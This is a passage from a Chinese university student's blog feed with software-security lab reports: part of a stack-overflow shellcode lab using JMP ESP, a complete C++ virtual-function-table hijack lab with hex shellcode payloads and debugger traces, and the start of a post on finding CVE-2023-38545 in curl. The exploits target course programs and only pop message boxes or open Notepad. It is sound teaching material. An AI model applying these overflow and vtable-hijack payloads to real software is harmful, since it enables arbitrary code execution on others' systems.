class="line">  </span><br><span class="line">        mov eax,esp </span><br><span class="line">        push <span class="number">0x5</span> </span><br><span class="line">        push eax </span><br><span class="line"></span><br><span class="line">        mov eax,<span class="number">0x77E78601</span>  <span class="comment">//WinExec入口地址  </span></span><br><span class="line">        call eax  </span><br><span class="line">        push ebx  </span><br><span class="line">        mov eax,<span class="number">0x77E7BB0B</span>  <span class="comment">//ExitProcess入口地址  </span></span><br><span class="line">        call eax  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>7.将shellcode.txt文件复制到所生成的项目文件夹shell_project下。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8740.png" alt="图40"></p>
<p>8.VC6中点击上方运行按钮运行shellcode.cpp程序，如下图所示成功弹出使用记事本打开的shellcode.txt。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8741.png" alt="图41"></p>
<h4 id="利用JMP-ESP进行shellcode注入"><a href="#利用JMP-ESP进行shellcode注入" class="headerlink" title="利用JMP ESP进行shellcode注入**"></a>利用JMP ESP进行shellcode注入**</h4><p><strong>（一）获取shellcode的指令码</strong></p>
<p>1.用ollydbg打开我们生成的shell_project.exe文件，找到我们编写的那些汇编语言。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8742.png" alt="图42"></p>
<p>2.复制选定我们需要的部分，右键保存到文件，得到shellcode.cpp操作码的文件opcode3.txt。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8743.png" alt="图43"></p>
<p>3.查看Debug文件夹下的opcode3.txt文件内容如下图所示。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8744.png" alt="图44"></p>
<p><strong>（二）查找overflow_exe中的shellcode起始地址</strong></p>
<p>1.用olldbg打开overflow_exe文件，在strcpy处添加断点。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8745.png" alt="图45"></p>
<p>2.开始执行到断点处，此时dest的提示就是要注入的shellcode的起始地址0x0012FAF0。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8746.png" alt="图46"></p>
<p><strong>（三）查找JMP ESP指令地址</strong></p>
<p>1.在strcpy函数上设置断点，运行至断点后右键选择overflow return address →ASCII overflow returns → search JMP&#x2F;CALL ESP，等待搜索完毕后点击日志查看。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8747.png" alt="图47"></p>
<p>2.查看日志后，选择一条JMP ESP的指令地址，如下图所示选择的JMP ESP指令地址为0x77FB948B。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8748.png" alt="图48"></p>
<p><strong>（四）编写password.txt</strong></p>
<p>1.在StackOverrun程序的文件夹下新建一个password.txt文件。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8749.png" alt="图49"></p>
<p>2.password.txt的文件结构应为“若干字节填充物+4字节JMP ESP地址（逆序）+shellcode+若干90”。</p>
<p>（1）为了知道开头需要多少字节的填充物，首先填充8字节进行尝试，此时password.txt如下图所示。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8750.png" alt="图50"></p>
<p>（2）使用ollydbg打开StackOverrun.exe时，在参数处输入“（password.txt内容）”。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8751.png" alt="图51"></p>
<p>（3）点击两次运行后，由缓冲区提示信息可知，从0012FF68到0012FF70都需要填充，因此password.txt开头需要十二字节的填充物，将password.txt修改如下图二所示。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8752.png" alt="图52"></p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8753.png" alt="图53"></p>
<p>（4）以修改后的password.txt内容为参数再次用ollydbg打开StackOverrun.exe。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8754.png" alt="图54"></p>
<p>3.点击运行按钮运行程序，如下图所示程序可以成功用记事本打开shellcode.txt。</p>
<p><img src="/2025/11/06/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C3/%E5%9B%BE%E7%89%8755.png" alt="图55"></p>
<h3 id="实验结论"><a href="#实验结论" class="headerlink" title="实验结论"></a>实验结论</h3><p>本次实验围绕shellcode注入技术展开，涵盖了从原理理解到实际操作的完整流程。首先，通过了解shellcode注入的基本原理，我掌握了缓冲区溢出攻击中代码植入的基本机制。在此基础上，我深入分析了示例中用于弹出对话框的汇编代码，理解了shellcode如何通过机器指令调用系统API实现特定功能。</p>
<p>在实践环节，我分别采用淹没静态地址和利用跳板两种方法成功实现了shellcode的代码植入。通过淹没静态地址的方式，我学会了如何精确计算内存地址并覆盖返回地址；而通过跳板技术，我掌握了如何利用程序已有的指令片段实现执行流的重定向。这两种方法从不同角度展示了攻击者如何利用程序漏洞获取控制权。</p>
<p>为了进一步探索shellcode的定制化能力，我还尝试修改汇编语句，实现了对消息框标题等参数的自定义设置。这让我认识到shellcode不仅能够执行固定功能，还可以通过参数调整实现更灵活的攻击效果。</p>
<p>实验的最高阶挑战是在不修改StackOverrun程序源代码的前提下，构造特殊的shellcode，通过JMP ESP的方式实现通过记事本打开指定文件。这一环节综合运用了CreateProcessA等Windows API的调用技巧，展现了shellcode技术在现实攻击中的实际应用场景。</p>
<p>通过这一系列实验，我深刻认识到shellcode注入技术的危害性。这种攻击方式可以完全绕过正常的程序执行流程，实现任意代码执行，轻则导致恶作剧式的弹窗，重则可实现文件操作、数据窃取、病毒植入等恶意行为。这凸显了软件安全防护的极端重要性。</p>
<p>本次实验让我对软件安全课程的核心价值有了更深入的理解。安全不是事后补救，而是应该贯穿于软件开发生命周期的每个环节。从代码编写时的输入验证、缓冲区边界检查，到编译部署阶段的安全机制启用（如DEP、ASLR），都需要系统性的安全思维。只有真正理解攻击原理，才能设计出有效的防御方案。在数字化时代，软件安全已然成为信息系统可靠运行的基石。作为未来的软件开发者，我们不仅要掌握功能实现的技术，更要具备安全防护的意识和能力。本次实验不仅提升了我的技术实践水平，更培养了我对软件安全重要性的深刻认知，这将对我未来的专业发展产生持久而积极的影响。</p>
<p><em>实验报告持续更新中…</em></p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>软件安全</tag>
        <tag>北邮</tag>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全实验5：虚函数攻击</title>
    <url>/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="软件安全第五次实验报告"><a href="#软件安全第五次实验报告" class="headerlink" title="软件安全第五次实验报告"></a>软件安全第五次实验报告</h2><p>其实是第四次实验，但是老师给的名称叫实验五。</p>
<h3 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h3><p>1.要求A</p>
<p>(1)了解虚函数攻击的基本原理</p>
<p>(2)调试虚函数攻击代码，理解虚函数工作机制与内存分布方式，掌握基本的虚函数攻击与计算方式，并可以用OllyDbg&#x2F;x32Dbg&#x2F;IDA Pro追踪观察。</p>
<p>(3)我们已经将shellcode直接写成变量在程序中，通过修改虚函数表指针，指向我们伪造的虚函数表，运行我们的shellcode。(注意程序中的shellcode的某些函数地址，可能需要修改，可直接在程序运行时直接在内存中修改。或者直接修改main.cpp，重新编译)，如果你有自己编写shellcode的想法，也可以自行在main.cpp中重新编译。</p>
<p>2.要求B</p>
<p>(1)在不修改源代码的情况下，研究如何利用栈溢出的方式攻击目标代码，通过命令行的方式植入shellcode，弹出对话框。（利用虚函数的特性实现shellcode注入即可）</p>
<p>3.要求C</p>
<p>(1)详述调试及追踪过程</p>
<p>(2)实验结果需要截图证明（如果自己编写shellcode，则需要重新编写的main.cpp和生成的.exe文件）</p>
<h3 id="实验步骤与结果"><a href="#实验步骤与结果" class="headerlink" title="实验步骤与结果"></a>实验步骤与结果</h3><h4 id="了解虚函数攻击的基本原理"><a href="#了解虚函数攻击的基本原理" class="headerlink" title="了解虚函数攻击的基本原理"></a>了解虚函数攻击的基本原理</h4><p>1.了解虚函数</p>
<p>（1）虚函数是C++实现多态性的重要方式。关于多态，简而言之就是用父类型的指针指向其子类的 实例，然后通过父类的指针调用实际子类的成员函数。这种技术可以让父类的指针有“多种形态”，这是一种泛型技术。C++的多态分为静态多态（编译时多态）和动态多态（运行时多态）两大类。静态多态通过重载、模板来实现；动态多态就是通过虚函数来体现的。</p>
<p>（2）虚函数（Virtual Function）是通过一张虚函数表vtbl（Virtual Table）来实现的。当一个类声明了虚函数或者继承了虚函数，这个类就会有自己的vtbl。对于一个包含虚函数的类的对象，在它的其他成员变量前会有一个虚表指针vptr（virtual table pointer），vptr指向它自己的虚表vtbl。当调用一个虚函数时，首先通过对象内存中的vptr找到虚函数表vtbl，接着通过vtbl找到对应虚函数的实现区域并进行调用。</p>
<p>2.包含虚函数的类的对象的内存布局如下。</p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%871.png" alt="图1"></p>
<p>3.了解虚函数攻击</p>
<p>由于C++虚函数表vtbl本身不可写，而虚函数表指针vptr一般处于可读数据段是可写的，对于C++虚函数的攻击也的本质可以称之为C++虚函数表的劫持。我们可以在实例调用虚函数之前，修改虚函数表的指针，让它指向伪造的虚函数表，在伪造的虚函数表中让虚函数指针指向shellcode。</p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%872.png" alt="图2"></p>
<h4 id="虚函数题目A"><a href="#虚函数题目A" class="headerlink" title="虚函数题目A"></a>虚函数题目A</h4><p>1.分析程序流程</p>
<p>（1）声明了一个类，具有一个成员变量buf和一个虚函数test，同时创建了一个它的实例overflow和一 个指向该类的指针</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">vf</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">vf overflow, *p;</span><br></pre></td></tr></table></figure>

<p>（2）加载了动态链接库”user32.dll”；通过实例overflow成员变量buf的地址，找到实例overflow的虚表指针vptr，修改虚表指针的地址。之后strcpy(overflow.buf,shellcode1)函数，利用缓冲区溢出的方式，植入shellcode；之后调用实例overflow的虚函数test()；而这时它的虚表指针已经发生变化了，所以运行的应该是shellcode。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="type">char</span> * p_vtable;</span><br><span class="line">	p_vtable=overflow.buf<span class="number">-4</span>;<span class="comment">//point to virtual table</span></span><br><span class="line">	<span class="comment">//__asm int 3</span></span><br><span class="line">	<span class="comment">//reset fake virtual table to 0x004088cc</span></span><br><span class="line">	<span class="comment">//the address may need to ajusted via runtime debug</span></span><br><span class="line">	p_vtable[<span class="number">0</span>]=<span class="number">0x30</span>;</span><br><span class="line">	p_vtable[<span class="number">1</span>]=<span class="number">0xE4</span>;</span><br><span class="line">	p_vtable[<span class="number">2</span>]=<span class="number">0x42</span>;</span><br><span class="line">	p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br><span class="line">	<span class="built_in">strcpy</span>(overflow.buf,shellcode1);<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">	p=&amp;overflow;</span><br><span class="line">	p-&gt;<span class="built_in">test</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（3）shellcode关键代码分析</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>地址</td>
<td>机器码</td>
<td>汇编代码</td>
<td>作用</td>
</tr>
<tr>
<td>0042E39C</td>
<td>33DB</td>
<td>xor ebx,ebx</td>
<td>将ebx置零</td>
</tr>
<tr>
<td>0042E39E</td>
<td>53</td>
<td>push ebx</td>
<td>将0入栈，作为截断字符</td>
</tr>
<tr>
<td>0042E39F</td>
<td>6862757074</td>
<td>push 0x74707562</td>
<td>将字符串”bupt”入栈</td>
</tr>
<tr>
<td>0042E3A4</td>
<td>6862757074</td>
<td>push 0x74707562</td>
<td>将字符串”bupt”入栈</td>
</tr>
<tr>
<td>0042E3A9</td>
<td>8BC4</td>
<td>mov eax,esp</td>
<td>eax中保存字符串”buptbupt”</td>
</tr>
<tr>
<td>0042E3AB</td>
<td>53</td>
<td>push ebx</td>
<td>0入栈，函数MessageBoxA（）的参数</td>
</tr>
<tr>
<td>0042E3AC</td>
<td>50</td>
<td>push eax</td>
<td>字符”buptbupt”入栈，函数MessageBoxA（）的参数</td>
</tr>
<tr>
<td>0042E3AD</td>
<td>50</td>
<td>push eax</td>
<td>字符”buptbupt”入栈，函数MessageBoxA（）的参数</td>
</tr>
<tr>
<td>0042E3AE</td>
<td>53</td>
<td>push ebx</td>
<td>0入栈，函数MessageBoxA（）的参数</td>
</tr>
<tr>
<td>0042E3AF</td>
<td>B8683DE277</td>
<td>mov eax,0x77E23D68</td>
<td></td>
</tr>
<tr>
<td>0042E3B4</td>
<td>FFD0</td>
<td>call eax</td>
<td>调用函数MessageBoxA（）</td>
</tr>
</tbody></table>
<p>2.利用x32dbg进行动态调试</p>
<p>（1）定位到修改虚表指针的代码，首先利用overflow实例的成员变量buf定位到虚表指针，其中vf.42e35c-4就是虚表指针的位置，因为overflow实例是一个全局变量，所以这个指向虚函数表 的指针存在于全局变量区，是可以修改的。</p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%873.png" alt="图3"></p>
<p>（2）在修改前，在内存vf.42e35c-4处可以看到原本的虚表指针，它指向的虚表是在只读数据段的。修改前，在内存vf.42e35c-4处可以看到原本的虚表指针0042E358，它指向的虚表是在只读数据段的。这段代码将这个虚表指针修改了，修改成一个指向0042e430的指针，在0042e430处保存新的虚表。</p>
<p>（3）继续跟进，程序之后调用strcpy函数将shellcode复制到了overflow实例的成员变量buf 上，而在这段内存中可以看到，修改之后的新的虚表的前四个字节是class vf的第一个虚函数，它指向了shellcode的开头，所以当overflow 实例调用虚函数时，就会自动跳转到shellcode之中。</p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%874.png" alt="图4"></p>
<p>（4）跟进代码到程序对虚函数test()的调用处：</p>
<p><strong>①mov dword ptr ds：[0x42E350]，vf.42E358</strong>：将overflow实例的地址赋值给一个指针，这个指针既表示overflow实例，也表示overflow实例的虚表指针</p>
<p><strong>②mov edx，dword ptr ds：[0x42E350] mov eax，dword ptr ds：[edx]：</strong>通过 overflow实例的虚表指针找到它的虚表，虚表在eax中</p>
<p><strong>③call dword ptr ds：[eax]：</strong>直接调用虚表中的第一个函数，也就是程序以为的test()函数</p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%875.png" alt="图5"></p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%876.png" alt="图6"></p>
<p>（5）这段代码跑完之后，函数自动跳转到0042e35c，也就是虚表中的第一个函数的入口点</p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%877.png" alt="图7"></p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%878.png" alt="图8"></p>
<p>（6）接下来执行shellcode，这里对MessageBoxA()函数的地址有问题，可以通过动态查询MessageBoxA的函数地址，修改程序之后执行。</p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%879.png" alt="图9"></p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%8710.png" alt="图10"></p>
<p>（7）执行完毕之后，程序可以成功弹出弹窗。</p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%8711.png" alt="图11"></p>
<h4 id="虚函数题目B"><a href="#虚函数题目B" class="headerlink" title="虚函数题目B"></a>虚函数题目B</h4><p>1.分析程序流程</p>
<p>（1）声明了两个类，他们各自拥有一个成员变量和一个虚函数。之后各自创建了一个实例overflow、overflow1和一个指向各自实例的指针。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">vf</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vf1</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">64</span>];</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout&lt;&lt;<span class="string">&quot;Class Vtable1::test()&quot;</span>&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">vf overflow, *p;</span><br><span class="line">vf1 overflow1, *p1;</span><br></pre></td></tr></table></figure>

<p>（2）首先加载了动态链接库user32.dll，之后对主函数的参数个数进行判断，如果参数个数不为3就输出并退出，否则就将参数argv[1]和argv[2]赋值给overflow.buf和overflow1.buf。此处 就存在shellcode植入的机会，之后调用overflow.test()。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">LoadLibrary</span>(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (argc == <span class="number">3</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">strcpy</span>(overflow.buf,argv[<span class="number">1</span>]);</span><br><span class="line">		<span class="built_in">strcpy</span>(overflow<span class="number">1.</span>buf,argv[<span class="number">2</span>]);<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">		p=&amp;overflow;</span><br><span class="line">		p-&gt;<span class="built_in">test</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;vf argv1 argv2\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.利用x32dbg进行动态调试</p>
<p>（1）随意输入两段利于定位的字符串，在程序执行完两端strcpy操作之后打个断点，观察内存情况。</p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%8712.png" alt="图12"></p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE13.png" alt="图13"></p>
<p>（2）可以利用args[2]复写overflow实例虚表，让他指向shellcode，并通过arg[1]构造shellcode。</p>
<p># args[1]<br>‘’’<br>66 81 EC 40 04 33 DB 53<br>68 62 75 70 74 68 62 75<br>70 74 8B C4 53 50 50 53<br>B8 00 49 F5 75 FF D0 53<br>B8 00 B1 E6 76 FF D0 66<br>5C EB 42<br>‘’’</p>
<p># args[2]<br>“””<br>30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30<br>30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30<br>30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30<br>30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30<br>30 30 30 30 84 EB 42<br>“””</p>
<p>（3）其中，两个函数MessageBoxA和ExitProcess通过查找得到地址。</p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%8714.png" alt="图14"></p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%8715.png" alt="图15"></p>
<p>（4）当两个字符串通过strcpy传入之后，内存情况如下。</p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE16.png" alt="图16"></p>
<p>（5）当程序调用overflow实例的虚函数test()时，就会跳转到shellcode上，然后成功输出弹窗，并且程序可以正常运行。</p>
<p><img src="/2025/11/27/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C5/%E5%9B%BE%E7%89%8717.png" alt="图17"></p>
<h3 id="实验结论"><a href="#实验结论" class="headerlink" title="实验结论"></a>实验结论</h3><p>本次虚函数攻击实验让我对C++底层机制的安全风险有了颠覆性的认识。在调试过程中，当我第一次看到虚函数表指针在内存中的具体位置，并成功通过计算偏移量修改其指向伪造的虚函数表时，我深刻意识到面向对象编程的”封装”和”多态”特性在内存层面竟是如此脆弱。通过单步跟踪虚函数调用过程，我观察到程序在调用虚函数时，会先通过对象内存起始地址的vptr指针找到虚函数表，再根据函数索引跳转到对应地址执行。这个原本用于实现多态的正常机制，一旦被恶意利用，就能成为攻击的突破口。</p>
<p>在栈溢出攻击实践中，我尝试通过精心构造的输入数据覆盖返回地址，并将shellcode植入栈中。这个过程让我体会到内存布局的精确计算的重要性。不仅需要准确计算虚函数表指针的偏移，还要考虑栈帧的对齐和地址随机化等现代防护机制的影响。当我成功通过命令行参数注入shellcode并弹出对话框时，我既为攻击的成功感到兴奋，也为这类漏洞的潜在危害感到担忧。这让我认识到，软件开发中任何一个看似微小的内存操作失误，都可能成为安全漏洞的根源。</p>
<p>通过这次实验，我深刻理解了软件安全课程的现实意义。安全不是可以事后添加的功能，而应该从程序设计之初就深入每一个环节。无论是虚函数表的安全验证，还是栈溢出的防护措施，都需要开发人员具备系统性的安全思维。这次实验不仅锻炼了我的逆向工程和漏洞分析能力，更重要的是让我建立起”攻击者思维”，这将帮助我在未来的开发工作中更好地预见和防范安全风险。理论与实践的结合，让我真正体会到安全研究的价值所在，只有深入理解攻击原理，才能构建更可靠的软件防护体系。</p>
<p><em>实验报告持续更新中…</em></p>
]]></content>
      <categories>
        <category>第5学期实验</category>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>软件安全</tag>
        <tag>北邮</tag>
        <tag>实验</tag>
      </tags>
  </entry>
  <entry>
    <title>软件安全开源贡献OpenKylin</title>
    <url>/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="软件安全Openkylin开源贡献操作文档"><a href="#软件安全Openkylin开源贡献操作文档" class="headerlink" title="软件安全Openkylin开源贡献操作文档"></a>软件安全Openkylin开源贡献操作文档</h2><h3 id="找到相应的openkylin和github仓库"><a href="#找到相应的openkylin和github仓库" class="headerlink" title="找到相应的openkylin和github仓库"></a>找到相应的openkylin和github仓库</h3><p>1.我们先找到一个感兴趣的openkylin仓库curl，<a href="https://gitee.com/openkylin/curl">https://gitee.com/openkylin/curl</a></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img1.png" alt="图1"></p>
<p>2.我们找到它对应的github仓库：<a href="https://github.com/curl/curl%EF%BC%8C%E5%B9%B6%E5%B0%86%E5%85%B6%E5%85%8B%E9%9A%86%E5%88%B0%E6%9C%AC%E5%9C%B0">https://github.com/curl/curl，并将其克隆到本地</a></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img2.png" alt="图2"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img3.png" alt="图3"></p>
<h3 id="寻找漏洞"><a href="#寻找漏洞" class="headerlink" title="寻找漏洞"></a>寻找漏洞</h3><p>1.我们进入到curl项目，然后执行git log –grep&#x3D;”CVE” –all-match命令，在整个github仓库的提交历史里，筛选出提交信息中匹配 “CVE”的提交记录并显示出来，我们观察到存在一个CVE-2023-38545漏洞已经在github仓库中被修复</p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img4.png" alt="图4"></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img5.png" alt="图5"></p>
<p>2.接下来我们进入<a href="https://gitee.com/openkylin/curl%E4%BB%93%E5%BA%93%EF%BC%8C%E6%9F%A5%E7%9C%8B%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E6%98%AF%E5%90%A6%E5%9C%A8openkylin%E5%BA%93%E4%B8%AD%E8%A2%AB%E6%8F%90%E5%87%BA%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%A7%82%E5%AF%9F%E5%88%B0%E8%BF%99%E4%B8%AA%E6%BC%8F%E6%B4%9E%E8%BF%98%E6%9C%AA%E6%8F%90%E4%BA%A4%E5%88%B0openkylin%E5%BA%93">https://gitee.com/openkylin/curl仓库，查看这个漏洞是否在openkylin库中被提出，可以观察到这个漏洞还未提交到openkylin库</a></p>
<p><img src="/2025/12/31/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8CKylin/img6.png" alt="图6"></p>
<p>3.我们仔细比对两个库的代码，发现这个漏洞确实还未修复，相关文件代码还未修改</p>
<p>（1）Github仓库：</p>
